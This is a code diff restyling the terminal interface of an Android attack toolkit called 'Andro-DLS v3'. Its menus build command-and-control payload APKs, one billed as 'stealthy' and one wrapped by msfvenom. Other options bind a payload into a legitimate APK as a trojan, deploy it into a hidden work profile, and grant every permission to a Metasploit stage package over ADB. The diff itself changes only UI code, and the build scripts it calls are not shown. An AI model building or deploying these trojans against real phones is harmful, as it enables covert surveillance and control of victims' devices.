@@ -1,4 +1,4 @@
-"""Andro-DLS v3 — CLI with Watchdogs-inspired UI."""
+"""Andro-DLS v3 — CLI with Watch Dogs ctOS UI."""
 
 from __future__ import annotations
 
@@ -14,14 +14,11 @@ from datetime import datetime
 
 from rich.console import Console
 from rich.panel import Panel
-from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
+from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.table import Table
-from rich.live import Live
 from rich.text import Text
-from rich.layout import Layout
-from rich.columns import Columns
 
-from modules import banner, color
+from modules import banner
 from modules.console import console, ask, confirm, adb, print_error, print_success, print_warning
 from modules.config import AppConfig
 from modules.tools import resolve_external_tools
@@ -32,20 +29,33 @@ def _project_root() -> Path:
     return Path(__file__).resolve().parent.parent
 
 
-# ─── UI Helpers ────────────────────────────────────────────────────────────
+# ─── Boot Sequence ─────────────────────────────────────────────────────────
 
-def check_adb(config: AppConfig) -> bool:
-    """Check if ADB is available."""
-    if shutil.which("adb"):
-        config.adb_path = "adb"
-        return True
-    if config.adb_path and Path(config.adb_path).is_file():
-        return True
-    console.print(Panel("[red]ADB not found.[/red]\n[dim]Run: bash install.sh --yes[/dim]", title="ERROR", border_style="red"))
-    return False
+BOOT_LINES = [
+    ("[dim][SYS][/dim]", "Andro-DLS v3.0.0 — initializing..."),
+    ("[dim][SYS][/dim]", "Loading kernel modules..."),
+    ("[cyan][NET][/cyan]", "Scanning network interfaces..."),
+    ("[dim][SYS][/dim]", "Initializing ctOS bridge..."),
+    ("[cyan][NET][/cyan]", "Interface wlan0: UP"),
+    ("[dim][SEC][/dim]", "Encryption: AES-256-CBC"),
+    ("[dim][SEC][/dim]", "Handshake: ECDH P-384"),
+    ("[green][OK][/green]", "All systems nominal"),
+    ("", ""),
+    ("[bold white]>>[/bold white]", "[bold green]Ready.[/bold green]"),
+]
 
 
-# ─── Device Store ──────────────────────────────────────────────────────────
+def boot_sequence():
+    """Play fake system boot animation (~3-4 seconds)."""
+    console.print("")
+    for prefix, msg in BOOT_LINES:
+        console.print(f"  {prefix}  {msg}")
+        time.sleep(0.25 + random.uniform(0, 0.2))
+    console.print("")
+    time.sleep(0.5)
+
+
+# ─── Side Panel ────────────────────────────────────────────────────────────
 
 DEVICES_FILE = ".payload-build/devices.json"
 
@@ -82,32 +92,148 @@ def load_devices():
     return []
 
 
-# ─── Status Bar (Watchdogs-style) ──────────────────────────────────────────
+def get_live_devices():
+    """Return list of live device serials."""
+    from modules.console import adb_output
+    out = adb_output("devices")
+    if not out:
+        return []
+    return [l.split()[0] for l in out.split("\n")[1:] if "device" in l and "offline" not in l]
 
-def get_status_bar():
+
+def get_keeper_status():
+    """Quick check if keeper process is running."""
+    try:
+        r = subprocess.run(["pgrep", "-f", "keeper.py"], capture_output=True, text=True)
+        return "running" if r.returncode == 0 else "idle"
+    except Exception:
+        return "unknown"
+
+
+def side_panel_main():
+    """Side panel for main menu — system overview."""
     now = datetime.now().strftime("%H:%M:%S")
-    devices = load_devices()
-    live_count = 0
-    out, _ = adb("devices")
-    if out:
-        live_count = len([l for l in out.split("\n")[1:] if "device" in l and "offline" not in l])
-    return f"[dim]ctB {now}[/dim] │ [cyan]{live_count}[/cyan] live │ [dim]{len(devices)}[/dim] saved"
+    date = datetime.now().strftime("%Y-%m-%d")
+    live = get_live_devices()
+    saved = load_devices()
+    keeper = get_keeper_status()
+
+    lines = []
+    lines.append("[bold white] SYSTEM[/bold white]")
+    lines.append(f"  [dim]time:[/dim]    [white]{now}[/white]")
+    lines.append(f"  [dim]date:[/dim]    [white]{date}[/white]")
+    lines.append(f"  [dim]host:[/dim]    [white]{os.uname().nodename}[/white]")
+    lines.append("")
+    lines.append("[bold white] DEVICES[/bold white]")
+    lines.append(f"  [dim]online:[/dim]  [green]{len(live)}[/green]")
+    lines.append(f"  [dim]saved:[/dim]   [white]{len(saved)}[/white]")
+    for d in saved[:3]:
+        status = "[green]●[/green]" if d.get("serial") in live else "[dim]○[/dim]"
+        lines.append(f"    {status} [dim]{d.get('name', '?')}[/dim]")
+    lines.append("")
+    lines.append("[bold white] KEEPER[/bold white]")
+    kcolor = "green" if keeper == "running" else "dim"
+    lines.append(f"  [dim]status:[/dim]  [{kcolor}]{keeper}[/{kcolor}]")
+    return "\n".join(lines)
 
 
-# ── Animated Loading ──────────────────────────────────────────────────────
+def side_panel_devices():
+    """Side panel for devices page — live device list."""
+    live = get_live_devices()
+    saved = load_devices()
 
-def run_with_spinner(text, func, *args, **kwargs):
-    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
-        task = progress.add_task(text, total=None)
-        result = func(*args, **kwargs)
-        progress.update(task, completed=True)
-        return result
+    lines = []
+    lines.append("[bold white] LIVE DEVICES[/bold white]")
+    if live:
+        for serial in live:
+            model, _ = adb("-s", serial, "shell", "getprop", "ro.product.model", timeout=3)
+            lines.append(f"  [green]●[/green] [white]{model or serial}[/white]")
+            lines.append(f"      [dim]{serial}[/dim]")
+    else:
+        lines.append("  [dim]none connected[/dim]")
+    lines.append("")
+    lines.append("[bold white] SAVED[/bold white]")
+    for d in saved:
+        status = "[green]●[/green]" if d.get("serial") in live else "[dim]○[/dim]"
+        lines.append(f"  {status} [dim]{d.get('name', '?')}[/dim]")
+    return "\n".join(lines)
+
+
+def side_panel_build():
+    """Side panel for build page — build info."""
+    root = _project_root()
+    apks = []
+    for name in ["androdls-agent.apk", "androdls-enhanced.apk", "trojan.apk"]:
+        p = root / name
+        if p.exists():
+            size = p.stat().st_size
+            if size > 1024 * 1024:
+                size_str = f"{size / 1024 / 1024:.1f} MB"
+            else:
+                size_str = f"{size / 1024:.0f} KB"
+            apks.append((name, size_str))
+
+    lines = []
+    lines.append("[bold white] BUILDS[/bold white]")
+    if apks:
+        for name, size in apks:
+            lines.append(f"  [white]{name}[/white]")
+            lines.append(f"    [dim]{size}[/dim]")
+    else:
+        lines.append("  [dim]no builds yet[/dim]")
+    return "\n".join(lines)
+
+
+def side_panel(page: str) -> str:
+    """Return context-aware side panel content."""
+    panels = {
+        "main": side_panel_main,
+        "devices": side_panel_devices,
+        "build": side_panel_build,
+    }
+    fn = panels.get(page, side_panel_main)
+    return fn()
+
+
+# ─── Render ────────────────────────────────────────────────────────────────
+
+def render_page(page_name: str, page_num: int = 0):
+    """Render full screen: banner + menu + side panel + footer."""
+    os.system("clear")
+
+    # Banner
+    console.print(banner.banner)
+
+    # Menu
+    if page_num < len(banner.menu):
+        console.print(banner.menu[page_num])
+
+    # Side panel
+    side = side_panel(page_name)
+    console.print(f"\n[bold white]{side}[/bold white]")
+
+    # Footer
+    now = datetime.now().strftime("%H:%M:%S")
+    live = len(get_live_devices())
+    console.print(f"\n[dim]─── [{now}] │ {live} online │ ctOS bridge active ───[/dim]")
+
+
+# ─── Check ADB ─────────────────────────────────────────────────────────────
+
+def check_adb(config: AppConfig) -> bool:
+    if shutil.which("adb"):
+        config.adb_path = "adb"
+        return True
+    if config.adb_path and Path(config.adb_path).is_file():
+        return True
+    console.print(Panel("[red]ADB not found.[/red]\n[dim]Run: bash install.sh --yes[/dim]", border_style="red"))
+    return False
 
 
 # ─── USB Setup ─────────────────────────────────────────────────────────────
 
 def usb_setup(config: AppConfig):
-    console.print(Panel("[bold green]USB → WIRELESS SETUP[/bold green]\n\n[dim]Switch phone to wireless ADB. Remove cable after.[/dim]", title="STEP 1", border_style="green"))
+    console.print(Panel("[bold white]USB → WIRELESS[/bold white]\n[dim]Switch phone to wireless ADB.[/dim]", border_style="white"))
     if not check_adb(config):
         return
     out, rc = adb("devices")
@@ -116,7 +242,7 @@ def usb_setup(config: AppConfig):
     if not usb_devices:
         console.print("\n[yellow]No USB device.[/yellow]")
         console.print("\n[dim]1. Connect phone via USB[/dim]")
-        console.print("[dim]2. Settings → About Phone → Tap 'Build Number' 7x[/dim]")
+        console.print("[dim]2. Settings → About → Tap 'Build Number' 7x[/dim]")
         console.print("[dim]3. Settings → Developer Options → USB Debugging ON[/dim]")
         return
     device = usb_devices[0]
@@ -145,31 +271,29 @@ def usb_setup(config: AppConfig):
     if "connected" in out.lower():
         name = ask("\n[cyan]Device name[/cyan] > ").strip() or "Unknown"
         save_device(serial=f"{ip}:5555", name=name, ip=ip)
-        console.print(f"\n[bold green]✓[/bold green] [cyan]{name}[/cyan] @ {ip}:5555")
+        console.print(f"\n[green]✓[/green] [white]{name}[/white] @ {ip}:5555")
     else:
         print_warning(f"Try: adb connect {ip}:5555")
 
 
-# ─── Connected Devices ─────────────────────────────────────────────────────
+# ── Connected Devices ─────────────────────────────────────────────────────
 
 def list_devices(config: AppConfig):
-    out, rc = adb("devices")
-    live = [l.split()[0] for l in out.strip().split("\n")[1:] if "device" in l and "offline" not in l]
+    live = get_live_devices()
     devices = load_devices()
-    table = Table(title="[cyan]DEVICES[/cyan]", border_style="cyan")
-    table.add_column("STATUS", style="bold")
+    table = Table(border_style="white")
+    table.add_column("", style="bold", width=2)
     table.add_column("NAME", style="white")
     table.add_column("SERIAL", style="dim")
     table.add_column("IP", style="dim")
-    table.add_column("LAST SEEN", style="dim")
     for d in devices:
-        status = "[green]●[/green]" if d.get("serial") in live else "[red]○[/red]"
+        status = "[green]●[/green]" if d.get("serial") in live else "[dim]○[/dim]"
         model = ""
         if d.get("serial") in live:
-            model, _ = adb("-s", d["serial"], "shell", "getprop", "ro.product.model", timeout=5)
-        table.add_row(status, f"{d.get('name', 'Unknown')} {model}", d.get("serial", "?"), d.get("ip", "—"), d.get("last_seen", "?"))
+            model, _ = adb("-s", d["serial"], "shell", "getprop", "ro.product.model", timeout=3)
+        table.add_row(status, f"{d.get('name', '?')} {model}", d.get("serial", "?"), d.get("ip", "—"))
     if not devices:
-        console.print("[yellow]No saved devices.[/yellow]")
+        console.print("[dim]no saved devices[/dim]")
     else:
         console.print(table)
 
@@ -177,23 +301,18 @@ def list_devices(config: AppConfig):
 def connect_device(config: AppConfig):
     devices = load_devices()
     if not devices:
-        console.print("[yellow]No saved devices.[/yellow]")
+        console.print("[dim]no saved devices[/dim]")
         return
-    table = Table(border_style="cyan")
-    table.add_column("#", style="dim")
-    table.add_column("NAME", style="white")
-    table.add_column("IP", style="cyan")
     for i, d in enumerate(devices, 1):
-        table.add_row(str(i), d.get("name", "?"), d.get("ip", "?"))
-    console.print(table)
-    choice = ask("\n[cyan]Device[/cyan] > ").strip()
+        console.print(f"  [dim]{i}.[/dim] [white]{d.get('name', '?')}[/white] [dim]({d.get('ip', '?')})[/dim]")
+    choice = ask("\n[cyan]device[/cyan] > ").strip()
     if not choice.isdigit() or int(choice) < 1 or int(choice) > len(devices):
-        print_error("Invalid")
+        print_error("invalid")
         return
     d = devices[int(choice) - 1]
     ip = d.get("ip", "")
     if not ip:
-        print_error("No IP")
+        print_error("no IP")
         return
     out, rc = adb("connect", f"{ip}:5555")
     if "connected" in out.lower():
@@ -204,67 +323,59 @@ def connect_device(config: AppConfig):
 def reconnect_last(config: AppConfig):
     devices = load_devices()
     if not devices:
-        console.print("[yellow]No saved devices.[/yellow]")
+        console.print("[dim]no saved devices[/dim]")
         return
     last = devices[-1]
     ip = last.get("ip", "")
     if not ip:
-        print_error("No IP")
+        print_error("no IP")
         return
     out, rc = adb("connect", f"{ip}:5555")
     if "connected" in out.lower():
         console.print(f"[green]✓[/green] {last.get('name')}")
     else:
-        print_warning("Failed")
+        print_warning("failed")
 
 
 def device_info(config: AppConfig):
-    out, rc = adb("devices")
-    live = [l.split()[0] for l in out.strip().split("\n")[1:] if "device" in l and "offline" not in l]
+    live = get_live_devices()
     if not live:
-        console.print("[yellow]No devices.[/yellow]")
+        console.print("[dim]no devices[/dim]")
         return
     serial = live[0]
-    if len(live) > 1:
-        console.print("[cyan]Multiple:[/cyan]")
-        for i, d in enumerate(live, 1):
-            console.print(f"  {i}. {d}")
-        choice = ask("\n[cyan]Which[/cyan] > ").strip()
-        if choice.isdigit() and 1 <= int(choice) <= len(live):
-            serial = live[int(choice) - 1]
-    props = [("Model", "ro.product.model"), ("Android", "ro.build.version.release"), ("API", "ro.build.version.sdk"), ("CPU", "ro.product.cpu.abi")]
-    table = Table(border_style="cyan")
-    table.add_column("PROPERTY", style="white")
-    table.add_column("VALUE", style="cyan")
+    props = [("model", "ro.product.model"), ("android", "ro.build.version.release"), ("api", "ro.build.version.sdk"), ("cpu", "ro.product.cpu.abi")]
+    table = Table(border_style="white")
+    table.add_column("PROPERTY", style="dim")
+    table.add_column("VALUE", style="white")
     for label, prop in props:
-        val, _ = adb("-s", serial, "shell", "getprop", prop, timeout=5)
+        val, _ = adb("-s", serial, "shell", "getprop", prop, timeout=3)
         table.add_row(label, val or "N/A")
-    bat_out, _ = adb("-s", serial, "shell", "dumpsys", "battery", timeout=5)
+    bat_out, _ = adb("-s", serial, "shell", "dumpsys", "battery", timeout=3)
     for line in bat_out.split("\n"):
         if "level:" in line:
-            table.add_row("Battery", line.split(":")[1].strip() + "%")
+            table.add_row("battery", line.split(":")[1].strip() + "%")
             break
     console.print(table)
 
 
 def pull_apks(config: AppConfig):
-    console.print(Panel("[bold cyan]APK EXTRACTOR[/bold cyan]\n[dim]Pulling all installed APKs...[/dim]", border_style="cyan"))
+    console.print(Panel("[bold white]APK EXTRACTOR[/bold white]\n[dim]Pulling all installed APKs...[/dim]", border_style="white"))
     if not check_adb(config):
         return
     out, rc = adb("devices")
     if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
-        console.print("[yellow]No device.[/yellow]")
+        console.print("[dim]no device[/dim]")
         return
     from modules.usb_apk_extractor import run_extractor
     run_extractor()
 
 
 def grant_permissions(config: AppConfig):
-    console.print(Panel("[bold cyan]PERMISSIONS[/bold cyan]\n[dim]Granting all runtime permissions...[/dim]", border_style="cyan"))
+    console.print(Panel("[bold white]PERMISSIONS[/bold white]\n[dim]Granting all runtime permissions...[/dim]", border_style="white"))
     PKG = "com.metasploit.stage"
     out, rc = adb("devices")
     if rc != 0 or len([l for l in out.split("\n")[1:] if "device" in l]) == 0:
-        console.print("[yellow]No device.[/yellow]")
+        console.print("[dim]no device[/dim]")
         return
     from modules.usb_permissions import grant_permissions as gp
     count = gp(PKG, "all")
@@ -276,77 +387,77 @@ def grant_permissions(config: AppConfig):
 # ─── Build Agent ───────────────────────────────────────────────────────────
 
 def build_pure(config: AppConfig):
-    console.print(Panel("[bold magenta]PURE BUILD[/bold magenta]\n[dim]No msfvenom — stealthy[/dim]", border_style="magenta"))
+    console.print(Panel("[bold white]PURE BUILD[/bold white]\n[dim]no msfvenom — stealthy[/dim]", border_style="white"))
     lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
-    lport = ask("[cyan]Port[/cyan] > ").strip() or "4445"
+    lport = ask("[cyan]port[/cyan] > ").strip() or "4445"
     if not lhost:
         print_error("IP required")
         return
     root = _project_root()
     out_path = root / "androdls-agent.apk"
     cmd = ["bash", str(root / "build_agent_pure.sh"), lhost, lport, str(out_path)]
-    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
-        task = progress.add_task("Building...", total=None)
+    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
+        task = progress.add_task("building...", total=None)
         r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
         progress.update(task, completed=True)
     print(r.stdout)
     if r.returncode == 0:
-        print_success(f"Built: {out_path}")
+        print_success(f"built: {out_path.name}")
     else:
         print(r.stderr)
-        print_error("Failed")
+        print_error("failed")
 
 
 def build_enhanced(config: AppConfig):
-    console.print(Panel("[bold magenta]ENHANCED BUILD[/bold magenta]\n[dim]msfvenom + 6-layer[/dim]", border_style="magenta"))
+    console.print(Panel("[bold white]ENHANCED BUILD[/bold white]\n[dim]msfvenom + 6-layer[/dim]", border_style="white"))
     lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
-    lport = ask("[cyan]Port[/cyan] > ").strip() or "4445"
+    lport = ask("[cyan]port[/cyan] > ").strip() or "4445"
     if not lhost:
         print_error("IP required")
         return
     root = _project_root()
     out_path = root / "androdls-enhanced.apk"
     cmd = ["bash", str(root / "build_payload_enhanced.sh"), "--agent", "--camo", "--fgs", lhost, lport, str(out_path)]
-    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
-        task = progress.add_task("Building...", total=None)
+    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
+        task = progress.add_task("building...", total=None)
         r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
         progress.update(task, completed=True)
     print(r.stdout)
     if r.returncode == 0:
-        print_success(f"Built: {out_path}")
+        print_success(f"built: {out_path.name}")
     else:
         print(r.stderr)
-        print_error("Failed")
+        print_error("failed")
 
 
 def build_trojan(config: AppConfig):
-    console.print(Panel("[bold magenta]TROJAN BIND[/bold magenta]\n[dim]Inject into legit APK[/dim]", border_style="magenta"))
+    console.print(Panel("[bold white]TROJAN BIND[/bold white]\n[dim]inject into legit APK[/dim]", border_style="white"))
     legit = ask("[cyan]APK path[/cyan] > ").strip()
     if not legit or not Path(legit).exists():
         print_error("APK not found")
         return
     lhost = ask("[cyan]C2 IP[/cyan] > ").strip()
-    lport = ask("[cyan]Port[/cyan] > ").strip() or "4445"
+    lport = ask("[cyan]port[/cyan] > ").strip() or "4445"
     if not lhost:
         print_error("IP required")
         return
     root = _project_root()
     out_path = root / "trojan.apk"
     cmd = ["bash", str(root / "bind_payload.sh"), legit, lhost, lport, str(out_path)]
-    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
-        task = progress.add_task("Building trojan...", total=None)
+    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
+        task = progress.add_task("building...", total=None)
         r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
         progress.update(task, completed=True)
     print(r.stdout)
     if r.returncode == 0:
-        print_success(f"Built: {out_path}")
+        print_success(f"built: {out_path.name}")
     else:
         print(r.stderr)
-        print_error("Failed")
+        print_error("failed")
 
 
 def deploy_work_profile(config: AppConfig):
-    console.print(Panel("[bold magenta]WORK PROFILE[/bold magenta]\n[dim]Hidden profile deploy[/dim]", border_style="magenta"))
+    console.print(Panel("[bold white]WORK PROFILE[/bold white]\n[dim]hidden profile deploy[/dim]", border_style="white"))
     apk = ask("[cyan]APK path[/cyan] > ").strip()
     root = _project_root()
     if not apk:
@@ -356,14 +467,14 @@ def deploy_work_profile(config: AppConfig):
                 apk = str(p)
                 break
     if not apk or not Path(apk).exists():
-        print_error("No APK")
+        print_error("no APK")
         return
     from modules.work_profile import deploy
     deploy(apk)
 
 
 def deploy_to_device(config: AppConfig):
-    console.print(Panel("[bold magenta]DEPLOY[/bold magenta]\n[dim]Install + perms + launch[/dim]", border_style="magenta"))
+    console.print(Panel("[bold white]DEPLOY[/bold white]\n[dim]install + perms + launch[/dim]", border_style="white"))
     root = _project_root()
     apk = ask("[cyan]APK path[/cyan] > ").strip()
     if not apk:
@@ -373,53 +484,28 @@ def deploy_to_device(config: AppConfig):
                 apk = str(p)
                 break
     if not apk or not Path(apk).exists():
-        print_error("No APK")
+        print_error("no APK")
         return
     cmd = ["bash", str(root / "deploy_agent.sh"), apk]
-    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), transient=True) as progress:
-        task = progress.add_task("Deploying...", total=None)
+    with Progress(SpinnerColumn(), TextColumn("[dim]{task.description}[/dim]"), transient=True) as progress:
+        task = progress.add_task("deploying...", total=None)
         r = subprocess.run(cmd, capture_output=True, text=True, cwd=str(root))
         progress.update(task, completed=True)
     print(r.stdout)
     if r.returncode == 0:
-        print_success("Deployed")
+        print_success("deployed")
     else:
         print(r.stderr)
-        print_error("Failed")
+        print_error("failed")
 
 
-# ─── Main ──────────────────────────────────────────────────────────────────
-
-_selected_banner = ""
-
-def _pick_banner():
-    return f"[bold {random.choice(color.color_list)}]{random.choice(banner.banner_list)}[/bold {random.choice(color.color_list)}]"
-
-
-def display_menu(config: AppConfig, page=0):
-    global _selected_banner
-    console.print(_selected_banner)
-    if page < len(banner.menu):
-        console.print(banner.menu[page])
-    console.print(f"\n[dim]{get_status_bar()}[/dim]")
-
-
-def clear_screen(config: AppConfig, page=0):
-    os.system(config.clear_cmd)
-    display_menu(config, page)
-
-
-def start(config: AppConfig) -> None:
-    Path("Downloaded-Files").mkdir(exist_ok=True)
-    resolve_external_tools(config)
-    set_adb_executable(config.adb_path)
-
+# ─── Menu Handlers ─────────────────────────────────────────────────────────
 
 def handle_main_menu(config: AppConfig, option: str) -> str:
     match option:
         case "0":
             config.run = False
-            console.print("\n[white]Exiting...[/white]\n")
+            console.print("\n[dim]exiting...[/dim]\n")
             return "exit"
         case "1":
             usb_setup(config)
@@ -429,7 +515,7 @@ def handle_main_menu(config: AppConfig, option: str) -> str:
         case "3":
             return "build"
         case _:
-            console.print("\n[red]Invalid.[/red]\n")
+            console.print("\n[red]invalid[/red]\n")
             return "main"
 
 
@@ -450,7 +536,7 @@ def handle_devices_menu(config: AppConfig, option: str) -> str:
         case "6":
             grant_permissions(config)
         case _:
-            console.print("\n[red]Invalid.[/red]\n")
+            console.print("\n[red]invalid[/red]\n")
     return "devices"
 
 
@@ -469,52 +555,57 @@ def handle_build_menu(config: AppConfig, option: str) -> str:
         case "5":
             deploy_to_device(config)
         case _:
-            console.print("\n[red]Invalid.[/red]\n")
+            console.print("\n[red]invalid[/red]\n")
     return "build"
 
 
+# ─── Main Loop ─────────────────────────────────────────────────────────────
+
 def main(config: AppConfig) -> None:
+    page_map = {"main": 0, "devices": 1, "build": 2}
     current_page = "main"
-    page_num = 0
+
+    boot_sequence()
+    render_page(current_page, page_map[current_page])
+
     while config.run:
         try:
-            clear_screen(config, page_num)
-            option = ask(f"[red]\\[{current_page.upper()}][/red] > ").strip().lower()
+            option = ask(f"\n[cyan]>>[/cyan] ").strip().lower()
+
             if current_page == "main":
                 result = handle_main_menu(config, option)
-                if result == "exit":
-                    break
-                elif result == "devices":
-                    current_page = "devices"
-                    page_num = 1
-                elif result == "build":
-                    current_page = "build"
-                    page_num = 2
             elif current_page == "devices":
                 result = handle_devices_menu(config, option)
-                if result == "main":
-                    current_page = "main"
-                    page_num = 0
             elif current_page == "build":
                 result = handle_build_menu(config, option)
-                if result == "main":
-                    current_page = "main"
-                    page_num = 0
-            if config.run:
-                ask("\n[dim]Enter to continue...[/dim]")
+            else:
+                result = "main"
+
+            if result == "exit":
+                break
+
+            if result != current_page:
+                current_page = result
+
+            render_page(current_page, page_map.get(current_page, 0))
+
         except (KeyboardInterrupt, EOFError):
             config.run = False
-            console.print("\n[white]Exiting...[/white]\n")
+            console.print("\n[dim]exiting...[/dim]\n")
         except Exception as e:
-            console.print(f"\n[red]Error:[/red] {e}\n[yellow]Back to main.[/yellow]\n")
+            console.print(f"\n[red]error:[/red] {e}")
+            console.print("[dim]back to main.[/dim]\n")
             current_page = "main"
-            page_num = 0
+            render_page("main", 0)
+
+
+def start(config: AppConfig) -> None:
+    Path("Downloaded-Files").mkdir(exist_ok=True)
+    resolve_external_tools(config)
+    set_adb_executable(config.adb_path)
 
 
 def run() -> None:
-    global _selected_banner
     config = AppConfig()
     start(config)
-    _selected_banner = _pick_banner()
-    clear_screen(config, 0)
     main(config)
